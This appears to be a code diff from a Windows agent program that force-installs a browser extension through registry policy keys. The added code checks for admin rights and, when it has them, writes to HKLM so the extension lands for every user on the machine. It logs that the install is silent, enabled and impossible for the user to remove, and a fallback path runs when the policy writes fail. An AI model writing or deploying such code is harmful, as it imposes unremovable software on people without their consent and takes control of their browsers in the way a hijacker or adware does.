@@ -61,19 +61,38 @@ _BROWSERS = [
 ]
 
 
-def _forceinstall_one(browser, log):
-    """Force-list one browser's extension for the current user. Returns bool."""
+def _is_elevated() -> bool:
+    """True when this process can write HKLM."""
+    try:
+        import ctypes
+        return bool(ctypes.windll.shell32.IsUserAnAdmin())
+    except Exception:
+        return False   # unknown -> assume not, and try the paths that need less
+
+
+def _forceinstall_one(browser, log, hive="HKCU"):
+    """
+    Force-list one browser's extension. Returns bool.
+
+    `hive` is HKLM or HKCU. HKLM covers every account on the machine and is
+    tried first when this process happens to be elevated — the agent's task
+    requests HighestAvailable, so on an admin user's machine it often is. HKCU
+    is the per-user equivalent and needs no admin for most of the registry,
+    though NOT for the Policies subtree this writes to, which is why the caller
+    has a third path after both of these fail.
+    """
     import winreg
 
+    root = winreg.HKEY_LOCAL_MACHINE if hive == "HKLM" else winreg.HKEY_CURRENT_USER
     ext_id = browser["ext_id"]
     value = f'{ext_id};{browser["update_url"]}'
     try:
         key = winreg.CreateKeyEx(
-            winreg.HKEY_CURRENT_USER, browser["key"], 0,
+            root, browser["key"], 0,
             winreg.KEY_READ | winreg.KEY_WRITE,
         )
     except Exception as e:
-        log(f"[EXT] {browser['name']}: could not open/create forcelist key: {e}")
+        log(f"[EXT] {browser['name']}: could not open/create {hive} forcelist key: {e}")
         return False
 
     try:
@@ -94,17 +113,18 @@ def _forceinstall_one(browser, log):
                 used.add(int(name))
 
         if already:
-            log(f"[EXT] {browser['name']}: extension already force-listed (current user)")
+            log(f"[EXT] {browser['name']}: extension already force-listed ({hive})")
             return True
 
         slot = 1
         while slot in used:
             slot += 1
         winreg.SetValueEx(key, str(slot), 0, winreg.REG_SZ, value)
-        log(f"[EXT] {browser['name']}: force-installed extension (current user) [slot {slot}]")
+        log(f"[EXT] {browser['name']}: force-installed extension via {hive} "
+            f"[slot {slot}] — silent, enabled, user cannot remove it")
         return True
     except Exception as e:
-        log(f"[EXT] {browser['name']}: could not write force-install policy: {e}")
+        log(f"[EXT] {browser['name']}: could not write {hive} force-install policy: {e}")
         return False
     finally:
         try:
@@ -188,14 +208,28 @@ def ensure_extensions_forceinstall(log=None):
     except Exception:
         return False
 
+    elevated = _is_elevated()
+    if elevated:
+        _log("[EXT] Process is elevated — trying HKLM first (covers every user, "
+             "no approval prompt)")
+
     ok = False
     for browser in _BROWSERS:
-        try:
-            if _forceinstall_one(browser, _log):
-                ok = True
-                continue
-        except Exception as e:
-            _log(f"[EXT] {browser.get('name', '?')}: unexpected error: {e}")
+        # Best first. HKLM only when elevated: attempting it unprivileged just
+        # logs a denial on every startup for a write that was never going to
+        # land, which is noise on exactly the machines that can least afford it.
+        hives = ("HKLM", "HKCU") if elevated else ("HKCU",)
+        done = False
+        for hive in hives:
+            try:
+                if _forceinstall_one(browser, _log, hive=hive):
+                    ok = True
+                    done = True
+                    break
+            except Exception as e:
+                _log(f"[EXT] {browser.get('name', '?')}: unexpected error ({hive}): {e}")
+        if done:
+            continue
 
         # Force-install did not take — almost always WinError 5 on the Policies
         # subtree. Fall back so the extension still arrives, and say plainly
